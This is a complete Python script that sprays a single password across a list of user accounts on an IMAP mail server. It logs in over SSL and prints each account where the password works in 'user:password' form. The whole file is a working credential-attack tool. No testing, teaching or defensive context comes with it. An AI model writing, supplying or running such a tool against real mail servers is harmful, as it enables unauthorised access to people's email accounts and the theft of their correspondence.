#!/usr/bin/env python3
"""Try IMAP login for multiple users with one password."""
import imaplib
import sys


def try_login(host: str, user: str, password: str) -> bool:
    try:
        m = imaplib.IMAP4_SSL(host, 993)
        m.login(user, password)
        m.logout()
        return True
    except Exception as e:
        print(f"[-] {user}: {e}")
        return False


def main():
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <host> <password> <user1> [user2 ...]", file=sys.stderr)
        sys.exit(1)
    host, password = sys.argv[1], sys.argv[2]
    users = sys.argv[3:]
    for u in users:
        if try_login(host, u, password):
            print(f"[+] {u}:{password}")


if __name__ == "__main__":
    main()